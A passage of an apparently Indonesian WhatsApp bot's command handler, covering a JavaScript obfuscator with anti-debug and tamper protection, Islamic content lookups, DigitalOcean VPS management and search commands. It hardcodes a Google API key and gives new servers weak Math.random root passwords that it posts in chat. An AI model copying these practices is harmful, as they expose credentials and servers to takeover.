                  const nums = '0123456789'
                  return 'z' + nums[Math.floor(Math.random() * nums.length)] + chars[Math.floor(Math.random() * chars.length)] + Math.random().toString(36).slice(2, 6)
                }

                const getUltraObf = () => ({
                  target: 'node',
                  compact: true,
                  renameVariables: true,
                  renameGlobals: true,
                  identifierGenerator: genUltra,
                  stringCompression: true,
                  stringEncoding: true,
                  stringSplitting: true,
                  controlFlowFlattening: 0.9,
                  flatten: true,
                  shuffle: true,
                  rgf: true,
                  deadCode: true,
                  opaquePredicates: true,
                  dispatcher: true,
                  lock: {
                    selfDefending: true,
                    antiDebug: true,
                    integrity: true,
                    tamperProtection: true
                  }
                })

                const bar = (p) => {
                  const t = 20
                  const f = Math.round(p / 5)
                  return `[${'â–ˆ'.repeat(f)}${' '.repeat(t - f)}] ${p}%`
                }

                let media = await downloadContentFromMessage(quoted, 'document')
                let buffer = Buffer.from([])
                for await (const chunk of media) buffer = Buffer.concat([buffer, chunk])
                const raw = buffer.toString('utf8')

                try {
                  new Function(raw)
                } catch (e) {
                  return reply(`âŒ File JS tidak valid:\n${e.message}`)
                }

                const obf = await JsConfuser.obfuscate(raw, getUltraObf())
                const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf)

                const outName = `ultra-encrypted-${Date.now()}.js`
                const outPath = path.join(__dirname, outName)
                fs.writeFileSync(outPath, code, 'utf8')

                const fileBuffer = fs.readFileSync(outPath)
                await sock.sendMessage(m.chat, {
                  document: fileBuffer,
                  mimetype: 'application/javascript',
                  fileName: outName,
                  caption: 'âœ… *Hardened Ultra encrypted!* â€” SATURN ğŸ”¥'
                }, {
                  quoted: fakeQuoted
                })

                try {
                  fs.unlinkSync(outPath)
                } catch (e) {}
              } catch (err) {
                console.error(err)
                reply(`âŒ Terjadi kesalahan: ${err && err.message ? err.message : String(err)}`)
              }
            }
            break
            
            // ISLAM MENU
                        case 'jadwal-sholat':
            case 'jadwalsholat':
            case 'sholat':
            case 'waktusholat': {
              try {
                if (!text) return reply(`Contoh penggunaan:\n${cmd} Surabaya`)

                const apiUrl = `https://api.vreyn.web.id/api/search/jadwalsholat?kota=${encodeURIComponent(text)}`
                const data = await fetchJson(apiUrl)

                if (!data.status || !data.result) {
                  return reply('Data jadwal sholat tidak ditemukan.')
                }

                const kota = data.city
                const tanggal = data.result.tanggal
                const {
                  imsak,
                  subuh,
                  terbit,
                  dhuha,
                  dzuhur,
                  ashar,
                  maghrib,
                  isya
                } = data.result

                const pesan = `
ğŸ•Œ *JADWAL SHOLAT HARI INI*
ğŸ“ *Kota:* ${kota}
ğŸ“… *Tanggal:* ${tanggal}

- Imsak : ${imsak}
- Subuh : ${subuh}
- Terbit : ${terbit}
- Dhuha : ${dhuha}
- Dzuhur : ${dzuhur}
- Ashar : ${ashar}
- Maghrib : ${maghrib}
- Isya : ${isya}

ğŸ“¡ *Sumber:* Kemenag RI
ğŸŒ *API:* api.vreyn.web.id
`.trim()

                reply(pesan)

              } catch (err) {
                console.error(err)
                reply('Terjadi kesalahan saat mengambil data jadwal sholat.')
              }
            }
            break

            case 'asmaulhusna': {
              try {
                let jir = await fetchJson('https://islamic-api-zhirrr.vercel.app/api/asmaulhusna')
                let ye = jir.data

                let tks = '*ASMAUL HUSNA*\n\n' + ye.map((item) => {
                  return `Urutan: ${item.index}\nLatin: ${item.latin}\nArab: ${item.arabic}\nTerjemahan ID: ${item.translation_id}\nTerjemahan EN: ${item.translation_en}\n`
                }).join('\n')

                reply(tks)
              } catch (err) {
                console.error(err)
                reply('Error cuy, coba lagi ntar!')
              }
            }
            break

            case 'niat-sholat':
            case 'niatsholat': {
              try {
                let jir = await fetchJson('https://islamic-api-zhirrr.vercel.app/api/niatshalat')
                let niatSholat = jir

                if (!text) {
                  let daftarNiat = '*DAFTAR NIAT SHOLAT*\n\n' + niatSholat.map((item) => `- ${item.name}`).join('\n')
                  daftarNiat += '\n\nKetik *.niatsholat [nama sholat]* untuk melihat niat, contoh: *.niatsholat subuh*'
                  reply(daftarNiat)
                } else {
                  let hasil = niatSholat.find((item) => item.name.toLowerCase().includes(text.toLowerCase()))

                  if (hasil) {
                    let tks = `*${hasil.name.toUpperCase()}*\n\n` +
                      `Arab: ${hasil.arabic}\n` +
                      `Latin: ${hasil.latin}\n` +
                      `Terjemahan: ${hasil.terjemahan}`
                    reply(tks)
                  } else {
                    reply('Niat sholat yang lu cari ga ketemu cuy. Cek lagi nama sholatnya!')
                  }
                }
              } catch (err) {
                console.error(err)
                reply('Error cuy, coba lagi ntar!')
              }
            }
            break

            case 'surah': {
              try {
                if (!text) {
                  reply('Ketik nomor surahnya! Contoh: *.surah 1* buat ambil ayat-ayat dari Al-Fatihah')
                  return
                }

                let response = await fetchJson(`https://api.siputzx.my.id/api/s/surah?no=${text}`)
                let data = response.data

                if (data.length > 0) {
                  let surahText = data.map((ayat, index) =>
                    `Ayat ${index + 1}:\n` +
                    `Arab: ${ayat.arab}\n` +
                    `Latin: ${ayat.latin}\n` +
                    `Terjemahan: ${ayat.indo}\n`
                  ).join('\n\n')

                  reply(surahText)
                } else {
                  reply('Gak ketemu, cek lagi nomor surahnya!')
                }
              } catch (err) {
                console.error(err)
                reply('Terjadi kesalahan: ' + err)
              }
            }
            break

            case 'doa':
            case 'berdoa': {
              try {
                let jir = await fetchJson('https://doa-doa-api-ahmadramadhan.fly.dev/api')
                let daftarDoa = jir

                if (!text) {
                  let listDoa = '*DAFTAR DOA*\n\n' + daftarDoa.map((item) => `- ${item.doa}`).join('\n')
                  listDoa += '\n\nKetik *.doa [nama doa]* untuk melihat doa, contoh: *.doa doa sebelum tidur*'
                  reply(listDoa)
                } else {
                  let hasil = daftarDoa.find((item) => item.doa.toLowerCase().includes(text.toLowerCase()))

                  if (hasil) {
                    let tks = `*${hasil.doa.toUpperCase()}*\n\n` +
                      `Ayat: ${hasil.ayat}\n` +
                      `Latin: ${hasil.latin}\n` +
                      `Artinya: ${hasil.artinya}`
                    reply(tks)
                  } else {
                    reply('Doa yang lu cari ga ketemu cuy. Cek lagi nama doanya!')
                  }
                }
              } catch (err) {
                console.error(err)
                reply('Error cuy, coba lagi ntar!')
              }
            }
            break

            case 'gislam': {
              if (!text) return reply('Mau cari tentang apa?')
              async function islam(query) {
                try {
                  const response = await fetchJson(`https://artikel-islam.netlify.app/.netlify/functions/api/ms?page=1&s=${Enc(query)}`)
                  if (response.success) {
                    const articles = response.data.data
                    let message = `Total artikel: ${articles.length}\n\n`
                    articles.forEach((article, index) => {
                      message += `${index + 1}. Judul: ${article.title}\nURL: ${article.url}\n\n`
                    })
                    return message
                  } else {
                    return 'Gagal mengambil data'
                  }
                } catch (error) {
                  return 'Terjadi kesalahan saat mengambil data'
                }
              }
              let lp = await islam(text)
              reply(lp)
            }
            break

            case 'kataislam': {
              async function AI(content) {
                try {
                  const response = await axios.post('https://ai.siputzx.my.id/', {
                    content,
                    cName: "S-AI",
                    cID: "S-AIbAQ0HcC"
                  });

                  return response.data
                } catch (error) {
                  console.error(error)
                  throw error
                }
              }
              let qe = 'Berikan satu kata-kata atau quotes Islamic random yang sangat memotivasi, dan menginspirasi, jawab langsung ke intinya!'
              let qo = await AI(qe)
              reply(qo.result)
            }
            break

            case 'pantunislam': {
              async function AI(content) {
                try {
                  const response = await axios.post('https://ai.siputzx.my.id/', {
                    content,
                    cName: "S-AI",
                    cID: "S-AIbAQ0HcC"
                  });

                  return response.data
                } catch (error) {
                  console.error(error)
                  throw error
                }
              }
              let qe = 'Berikan satu kata-kata pantun Islamic random yang sangat memotivasi, dan menginspirasi, jawab langsung ke intinya!'
              let qo = await AI(qe)
              reply(qo.result)
            }
            break
            
             // === Digital Ocean
            case 'cvps1g1c':
            case 'vps1g1c': {
              if (!isOwner) return reply(mess.owner)

              let hostname = args[0];
              if (!hostname) return reply('Masukkan hostname VPS nya!');

              try {
                let dropletData = {
                  name: hostname,
                  region: 'sgp1',
                  size: 's-1vcpu-1gb', // 1GB RAM, 1 CPU
                  image: 'ubuntu-20-04-x64',
                  ssh_keys: null,
                  backups: false,
                  ipv6: true,
                  user_data: null,
                  private_networking: null,
                  volumes: null,
                  tags: ['T']
                };

                function generatePassword() {
                  const length = 8;
                  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                  let password = "";
                  for (let i = 0; i < length; i++) {
                    const randomIndex = Math.floor(Math.random() * charset.length);
                    password += charset[randomIndex];
                  }
                  return password;
                }

                let password = generatePassword();
                dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

                let response = await fetch('https://api.digitalocean.com/v2/droplets', {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + doToken
                  },
                  body: JSON.stringify(dropletData)
                });

                let responseData = await response.json();

                if (response.ok) {
                  let dropletConfig = responseData.droplet;
                  let dropletId = dropletConfig.id;

                  reply(`Tunggu Sebentar...`);
                  await new Promise(resolve => setTimeout(resolve, 60000));

                  let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: 'GET',
                    headers: {
                      'Content-Type': 'application/json',
                      'Authorization': "Bearer " + doToken
                    }
                  });

                  let dropletInfo = await dropletResponse.json();
                  let ipVPS = dropletInfo.droplet.networks.v4 && dropletInfo.droplet.networks.v4.length > 0 ?
                    dropletInfo.droplet.networks.v4[0].ip_address :
                    "Tidak ada alamat IP yang tersedia!";

                  let messageText = `VPS berhasil dibuat!\n\n`;
                  messageText += `ID: ${dropletId}\n`;
                  messageText += `IP VPS: ${ipVPS}\n`;
                  messageText += `Password: ${password}\n`;

                  await sock.sendMessage(m.chat, {
                    text: messageText
                  }, {
                    quoted: fakeQuoted
                  });
                } else {
                  throw new Error(`Gagal membuat VPS: ${responseData.message}`);
                }
              } catch (err) {
                console.error(err);
                reply(`Terjadi kesalahan saat membuat VPS: ${err.message || err}`);
              }
            }
            break

            case 'cvps2g1c':
            case 'vps2g1c': {
              if (!isOwner) return reply(mess.owner)

              let hostname = args[0];
              if (!hostname) return reply('Masukkan hostname VPS nya!');

              try {
                let dropletData = {
                  name: hostname,
                  region: 'sgp1',
                  size: 's-1vcpu-2gb', // 2GB RAM, 1 CPU
                  image: 'ubuntu-20-04-x64',
                  ssh_keys: null,
                  backups: false,
                  ipv6: true,
                  user_data: null,
                  private_networking: null,
                  volumes: null,
                  tags: ['T']
                };

                function generatePassword() {
                  const length = 8;
                  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                  let password = "";
                  for (let i = 0; i < length; i++) {
                    const randomIndex = Math.floor(Math.random() * charset.length);
                    password += charset[randomIndex];
                  }
                  return password;
                }

                let password = generatePassword();
                dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

                let response = await fetch('https://api.digitalocean.com/v2/droplets', {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + doToken
                  },
                  body: JSON.stringify(dropletData)
                });

                let responseData = await response.json();

                if (response.ok) {
                  let dropletConfig = responseData.droplet;
                  let dropletId = dropletConfig.id;

                  reply(`Tunggu Sebentar...`);
                  await new Promise(resolve => setTimeout(resolve, 60000));

                  let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: 'GET',
                    headers: {
                      'Content-Type': 'application/json',
                      'Authorization': "Bearer " + doToken
                    }
                  });

                  let dropletInfo = await dropletResponse.json();
                  let ipVPS = dropletInfo.droplet.networks.v4 && dropletInfo.droplet.networks.v4.length > 0 ?
                    dropletInfo.droplet.networks.v4[0].ip_address :
                    "Tidak ada alamat IP yang tersedia!";

                  let messageText = `VPS berhasil dibuat!\n\n`;
                  messageText += `ID: ${dropletId}\n`;
                  messageText += `IP VPS: ${ipVPS}\n`;
                  messageText += `Password: ${password}\n`;

                  await sock.sendMessage(m.chat, {
                    text: messageText
                  }, {
                    quoted: fakeQuoted
                  });
                } else {
                  throw new Error(`Gagal membuat VPS: ${responseData.message}`);
                }
              } catch (err) {
                console.error(err);
                reply(`Terjadi kesalahan saat membuat VPS: ${err.message || err}`);
              }
            }
            break

            case 'cvps4g2c':
            case 'vps4g2c': {
              if (!isOwner) return reply(mess.owner)

              let hostname = args[0];
              if (!hostname) return reply('Masukkan hostname VPS nya!');

              try {
                let dropletData = {
                  name: hostname,
                  region: 'sgp1',
                  size: 's-2vcpu-4gb', // 4GB RAM, 2 CPU
                  image: 'ubuntu-20-04-x64',
                  ssh_keys: null,
                  backups: false,
                  ipv6: true,
                  user_data: null,
                  private_networking: null,
                  volumes: null,
                  tags: ['T']
                };

                function generatePassword() {
                  const length = 8;
                  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                  let password = "";
                  for (let i = 0; i < length; i++) {
                    const randomIndex = Math.floor(Math.random() * charset.length);
                    password += charset[randomIndex];
                  }
                  return password;
                }

                let password = generatePassword();
                dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

                let response = await fetch('https://api.digitalocean.com/v2/droplets', {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + doToken
                  },
                  body: JSON.stringify(dropletData)
                });

                let responseData = await response.json();

                if (response.ok) {
                  let dropletConfig = responseData.droplet;
                  let dropletId = dropletConfig.id;

                  reply(`Tunggu Sebentar...`);
                  await new Promise(resolve => setTimeout(resolve, 60000));

                  let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: 'GET',
                    headers: {
                      'Content-Type': 'application/json',
                      'Authorization': "Bearer " + doToken
                    }
                  });

                  let dropletInfo = await dropletResponse.json();
                  let ipVPS = dropletInfo.droplet.networks.v4 && dropletInfo.droplet.networks.v4.length > 0 ?
                    dropletInfo.droplet.networks.v4[0].ip_address :
                    "Tidak ada alamat IP yang tersedia!";

                  let messageText = `VPS berhasil dibuat!\n\n`;
                  messageText += `ID: ${dropletId}\n`;
                  messageText += `IP VPS: ${ipVPS}\n`;
                  messageText += `Password: ${password}\n`;

                  await sock.sendMessage(m.chat, {
                    text: messageText
                  }, {
                    quoted: fakeQuoted
                  });
                } else {
                  throw new Error(`Gagal membuat VPS: ${responseData.message}`);
                }
              } catch (err) {
                console.error(err);
                reply(`Terjadi kesalahan saat membuat VPS: ${err.message || err}`);
              }
            }
            break

            case 'cvps8g4c':
            case 'vps8g4c': {
              if (!isOwner) return reply(mess.owner)

              let hostname = args[0];
              if (!hostname) return reply('Masukkan hostname VPS nya!');

              try {
                let dropletData = {
                  name: hostname,
                  region: 'sgp1',
                  size: 's-4vcpu-8gb', // 8GB RAM, 4 CPU
                  image: 'ubuntu-20-04-x64',
                  ssh_keys: null,
                  backups: false,
                  ipv6: true,
                  user_data: null,
                  private_networking: null,
                  volumes: null,
                  tags: ['T']
                };

                function generatePassword() {
                  const length = 8;
                  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                  let password = "";
                  for (let i = 0; i < length; i++) {
                    const randomIndex = Math.floor(Math.random() * charset.length);
                    password += charset[randomIndex];
                  }
                  return password;
                }

                let password = generatePassword();
                dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

                let response = await fetch('https://api.digitalocean.com/v2/droplets', {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + doToken
                  },
                  body: JSON.stringify(dropletData)
                });

                let responseData = await response.json();

                if (response.ok) {
                  let dropletConfig = responseData.droplet;
                  let dropletId = dropletConfig.id;

                  reply(`Tunggu Sebentar...`);
                  await new Promise(resolve => setTimeout(resolve, 60000));

                  let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: 'GET',
                    headers: {
                      'Content-Type': 'application/json',
                      'Authorization': "Bearer " + doToken
                    }
                  });

                  let dropletInfo = await dropletResponse.json();
                  let ipVPS = dropletInfo.droplet.networks.v4 && dropletInfo.droplet.networks.v4.length > 0 ?
                    dropletInfo.droplet.networks.v4[0].ip_address :
                    "Tidak ada alamat IP yang tersedia!";

                  let messageText = `VPS berhasil dibuat!\n\n`;
                  messageText += `ID: ${dropletId}\n`;
                  messageText += `IP VPS: ${ipVPS}\n`;
                  messageText += `Password: ${password}\n`;

                  await sock.sendMessage(m.chat, {
                    text: messageText
                  }, {
                    quoted: fakeQuoted
                  });
                } else {
                  throw new Error(`Gagal membuat VPS: ${responseData.message}`);
                }
              } catch (err) {
                console.error(err);
                reply(`Terjadi kesalahan saat membuat VPS: ${err.message || err}`);
              }
            }
            break

            case 'cvps16g4c':
            case 'vps16g4c': {
              if (!isOwner) return reply(mess.owner)

              let hostname = args[0];
              if (!hostname) return reply('Masukkan hostname VPS nya!');

              try {
                let dropletData = {
                  name: hostname,
                  region: 'sgp1',
                  size: 's-4vcpu-16gb', // 16GB RAM, 4 CPU
                  image: 'ubuntu-20-04-x64',
                  ssh_keys: null,
                  backups: false,
                  ipv6: true,
                  user_data: null,
                  private_networking: null,
                  volumes: null,
                  tags: ['T']
                };

                function generatePassword() {
                  const length = 8;
                  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                  let password = "";
                  for (let i = 0; i < length; i++) {
                    const randomIndex = Math.floor(Math.random() * charset.length);
                    password += charset[randomIndex];
                  }
                  return password;
                }

                let password = generatePassword();
                dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

                let response = await fetch('https://api.digitalocean.com/v2/droplets', {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + doToken
                  },
                  body: JSON.stringify(dropletData)
                });

                let responseData = await response.json();

                if (response.ok) {
                  let dropletConfig = responseData.droplet;
                  let dropletId = dropletConfig.id;

                  reply(`Tunggu Sebentar...`);
                  await new Promise(resolve => setTimeout(resolve, 60000));

                  let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: 'GET',
                    headers: {
                      'Content-Type': 'application/json',
                      'Authorization': "Bearer " + doToken
                    }
                  });

                  let dropletInfo = await dropletResponse.json();
                  let ipVPS = dropletInfo.droplet.networks.v4 && dropletInfo.droplet.networks.v4.length > 0 ?
                    dropletInfo.droplet.networks.v4[0].ip_address :
                    "Tidak ada alamat IP yang tersedia!";

                  let messageText = `VPS berhasil dibuat!\n\n`;
                  messageText += `ID: ${dropletId}\n`;
                  messageText += `IP VPS: ${ipVPS}\n`;
                  messageText += `Password: ${password}\n`;

                  await sock.sendMessage(m.chat, {
                    text: messageText
                  }, {
                    quoted: fakeQuoted
                  });
                } else {
                  throw new Error(`Gagal membuat VPS: ${responseData.message}`);
                }
              } catch (err) {
                console.error(err);
                reply(`Terjadi kesalahan saat membuat VPS: ${err.message || err}`);
              }
            }
            break

            case 'listdroplet': {
              if (!isOwner) return reply(mess.owner)

              try {
                const getDroplets = async () => {
                  try {
                    const response = await fetch('https://api.digitalocean.com/v2/droplets', {
                      headers: {
                        Authorization: `Bearer ${doToken}`
                      }
                    });
                    const data = await response.json();
                    return data.droplets || [];
                  } catch (err) {
                    reply('Error fetching droplets: ' + err);
                    return [];
                  }
                };

                getDroplets().then(droplets => {
                  let totalvps = droplets.length;
                  let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

                  if (droplets.length === 0) {
                    mesej += 'Tidak ada droplet yang tersedia!';
                  } else {
                    droplets.forEach(droplet => {
                      const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
                      const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
                      mesej += `Droplet ID: ${droplet.id}\n`;
                      mesej += `Hostname: ${droplet.name}\n`;
                      mesej += `Username: Root\n`;
                      mesej += `IP: ${ipAddress}\n`;
                      mesej += `Ram: ${droplet.memory} MB\n`;
                      mesej += `Cpu: ${droplet.vcpus} CPU\n`;
                      mesej += `OS: ${droplet.image.distribution}\n`;
                      mesej += `Storage: ${droplet.disk} GB\n`;
                      mesej += `Status: ${droplet.status}\n\n`;
                    });
                  }

                  sock.sendMessage(m.chat, {
                    text: mesej
                  }, {
                    quoted: fakeQuoted
                  });
                });
              } catch (err) {
                reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
              }
            }
            break

            case 'deldroplet': {
              if (!isOwner) return reply(mess.owner)
              let dropletId = args[0];
              if (!dropletId) return reply('ID droplet belum diberikan!');

              const deleteDroplet = async () => {
                try {
                  let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: 'DELETE',
                    headers: {
                      'Content-Type': 'application/json',
                      'Authorization': `Bearer ${doToken}`
                    }
                  });

                  if (response.ok) {
                    reply('Droplet berhasil dihapus!');
                  } else {
                    const errorData = await response.json();
                    return new Error(`Gagal menghapus droplet: ${errorData.message}`);
                  }
                } catch (error) {
                  console.error('Terjadi kesalahan saat menghapus droplet:', error);
                  reply('Terjadi kesalahan saat menghapus droplet.');
                }
              };

              deleteDroplet();
            }
            break

            case 'sisadroplet': {
              if (!isOwner) return reply(mess.owner)

              async function getDropletInfo() {
                try {
                  const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
                    headers: {
                      Authorization: `Bearer ${doToken}`,
                    },
                  });

                  const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
                    headers: {
                      Authorization: `Bearer ${doToken}`,
                    },
                  });

                  if (accountResponse.status === 200 && dropletsResponse.status === 200) {
                    const dropletLimit = accountResponse.data.account.droplet_limit;
                    const dropletsCount = dropletsResponse.data.droplets.length;
                    const remainingDroplets = dropletLimit - dropletsCount;

                    return {
                      dropletLimit,
                      remainingDroplets,
                      totalDroplets: dropletsCount,
                    };
                  } else {
                    throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet!');
                  }
                } catch (err) {
                  throw new Error(err.message);
                }
              }

              async function sisadropletHandler() {
                try {
                  const dropletInfo = await getDropletInfo();
                  reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}\n\nTotal droplet terpakai: ${dropletInfo.totalDroplets}`);
                } catch (err) {
                  reply(`Terjadi kesalahan: ${err.message}`);
                }
              }

              sisadropletHandler();
            }
            break

            case 'cekdroplet': {
              if (!isOwner) return reply(mess.owner)
              let dropletId = args[0];
              if (!dropletId) return reply('ID droplet belum diberikan!');

              const getDropletInfo = async (dropletId) => {
                try {
                  const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
                  const response = await fetch(apiUrl, {
                    headers: {
                      'Content-Type': 'application/json',
                      'Authorization': `Bearer ${doToken}`
                    }
                  });

                  if (response.ok) {
                    const data = await response.json();
                    const droplet = data.droplet;
                    const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
                    const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
                    const vpsRam = droplet.memory / 1024;

                    return {
                      dropletid: droplet.id,
                      username: droplet.name,
                      ip: ipAddress,
                      ram: `${vpsRam} GB`,
                      os: droplet.image.distribution,
                      cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
                      storage: droplet.disk,
                      status: droplet.status
                    };
                  } else {
                    const errorData = await response.json();
                    return new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
                  }
                } catch (err) {
                  reply('Terjadi kesalahan saat memeriksa detail droplet:', err.message);
                  return new Error('Terjadi kesalahan saat memeriksa detail droplet.');
                }
              };

              getDropletInfo(dropletId)
              .then((info) => {
                let textku = `*DETAIL VPS KAMU*\n`;
                textku += `Droplet ID: ${info.dropletid}\n`;
                textku += `Hostname: ${info.username}\n`;
                textku += `IPv4: ${info.ip}\n`;
                textku += `Ram: ${info.ram}\n`;
                textku += `OS: ${info.os}\n`;
                textku += `CPU: ${info.cpu}\n`;
                textku += `Storage: ${info.storage}\n`;
                textku += `Status: ${info.status}`;

                sock.sendMessage(m.chat, {
                  text: textku
                }, {
                  quoted: fakeQuoted
                });
              })
              .catch((err) => {
                reply(err);
                sock.sendMessage(m.chat, {
                  text: 'Terjadi kesalahan saat memeriksa detail VPS.'
                });
              });
            }
            break

            case 'turnon': {
              if (!isOwner) return reply(mess.owner)
              let dropletId = args[0];
              if (!dropletId) return reply('ID droplet belum diberikan!');

              async function turnOnDroplet() {
                try {
                  const response = await axios.post(
                    `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
                      type: 'power_on',
                    }, {
                      headers: {
                        'Content-Type': 'application/json',
                        Authorization: `Bearer ${doToken}`,
                      },
                    }
                  );

                  if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
                    reply('VPS (droplet) sedang dihidupkan...');
                  } else {
                    reply('Gagal menghidupkan VPS (droplet).');
                  }
                } catch (err) {
                  reply('Terjadi kesalahan saat menghidupkan VPS (droplet):', err.message);
                }
              }

              turnOnDroplet();
            }
            break

            case 'turnoff': {
              if (!isOwner) return reply(mess.owner)
              let dropletId = args[0];
              if (!dropletId) return reply('ID droplet belum diberikan!');

              async function turnOffDroplet() {
                try {
                  const response = await axios.post(
                    `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
                      type: 'power_off',
                    }, {
                      headers: {
                        'Content-Type': 'application/json',
                        Authorization: `Bearer ${doToken}`,
                      },
                    }
                  );

                  if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
                    reply('VPS (droplet) sedang dimatikan...');
                  } else {
                    reply('Gagal mematikan VPS (droplet).');
                  }
                } catch (err) {
                  reply('Terjadi kesalahan saat mematikan VPS (droplet):', err.message);
                }
              }

              turnOffDroplet();
            }
            break

            case 'restartvps': {
              if (!isOwner) return reply(mess.owner)
              let dropletId = args[0];
              if (!dropletId) return reply('ID droplet belum diberikan!');

              const restartVPS = async (dropletId) => {
                try {
                  const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;
                  const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                      'Content-Type': 'application/json',
                      Authorization: `Bearer ${doToken}`,
                    },
                    body: JSON.stringify({
                      type: 'reboot',
                    }),
                  });

                  if (response.ok) {
                    const data = await response.json();
                    return data.action;
                  } else {
                    const errorData = await response.json();
                    reply(`Gagal melakukan restart VPS: ${errorData.message}`);
                  }
                } catch (err) {
                  reply('Terjadi kesalahan saat melakukan restart VPS:', err.message);
                }
              };

              restartVPS(dropletId)
              .then((action) => {
                reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
              })
              .catch((err) => {
                reply(err.message);
              });
            }
            break
             // === Search Menu

            case 'playstore':
            case 'pstore': {
              if (!text) return reply(`Contoh: ${cmd} whatsapp`);
              try {
                let loo = await fetchJson(`https://api.vreden.web.id/api/playstore?query=${text}`);
                let results = loo.result;

                if (!results.length) return reply('Tidak ada hasil ditemukan.');
                let gambar = results[0]?.img;
                let teks = results.map((yoo, i) => {
                  return `*${i + 1}. ${text.toUpperCase()}*
Developer: ${yoo.developer}
Rating: ${yoo.rate2}
Link: ${yoo.link}
Link Developer: ${yoo.link_dev}`;
                }).join('\n\n');
                await sock.sendMessage(m.chat, {
                  image: {
                    url: gambar
                  },
                  caption: teks
                }, {
                  quoted: fakeQuoted
                });
              } catch (err) {
                console.error(err);
                reply(err.toString());
              }
            }
            break

            case 'playstation':
            case 'pstation': {
              if (!text) return reply(`Contoh: ${cmd} Naruto`);
              try {
                let loo = await fetchJson(`https://fastrestapis.fasturl.cloud/search/playstation?query=${text}`);
                let gambar = loo.result[0]?.images;
                let teks = loo.result.map((yoo, i) => {
                  return `*${i + 1}. ${yoo.title.toUpperCase()}*
Link: ${yoo.link}`;
                }).join('\n\n');
                await sock.sendMessage(m.chat, {
                  image: {
                    url: gambar
                  },
                  caption: teks
                }, {
                  quoted: fakeQuoted
                });
              } catch (err) {
                console.error(err);
                reply(err.toString());
              }
            }
            break

            case 'google': {
              if (!text) return reply(`Contoh: ${cmd} Vynaa`)
              const apiKey = 'AIzaSyAajE2Y-Kgl8bjPyFvHQ-PgRUSMWgBEsSk'
              const cx = 'e5c2be9c3f94c4bbb'
              const query = text
              const url = `https://www.googleapis.com/customsearch/v1?q=${query}&key=${apiKey}&cx=${cx}`
              fetch(url).then(response => response.json()).then(data => {
                if (data.items && data.items.length > 0) {
                  let teks = `Hasil pencarian Google: ${kapital(text)}\n\n`
                  data.items.forEach(item => {
                    teks += `â€¢ Judul: ${item.title}\n`
                    teks += `â€¢ Deskripsi: ${item.snippet}\n`
                    teks += `â€¢ Link: ${item.link}\n\n`
                  })
                  reply(teks)
                } else {
                  reply('Tidak ada hasil yang ditemukan')
                }
              }).catch(err => {
                reply('Terjadi kesalahan')
              })
            }
            break

            case 'chrome':
            case 'chromes':
            case 'chromesrc':
            case 'chromesearch': {
              if (!text) return reply(`Contoh: ${cmd} Vynaa`);

              const {
                Chrome
              } = require('./lib-signal/data-utils/scrape')
              Chrome(text).then(results => {
                if (results.length > 0) {
                  let hasil = '';

                  results.forEach(item => {
                    hasil += `â€¢ Judul: ${item.title}\n` +
                      `â€¢ Publisher: ${item.publisher}\n` +
                      `â€¢ Rating: ${item.rating} (${item.ratingCount} ulasan)\n` +
                      `â€¢ Link: ${item.link}\n\n`;
                  });

                  try {
                    sock.sendMessage(
                      m.chat, {
                        image: {
                          url: results[0].imgSrc
                        },
                        caption: hasil
                      }, {
                        quoted: fakeQuoted
                      }
                    );
                  } catch (err) {
                    reply(hasil);
                  }
                } else {
                  reply('Terjadi kesalahan')
                }
              }).catch(err => {
                reply('Terjadi kesalahan: ' + err.message);
              })
            }
            break

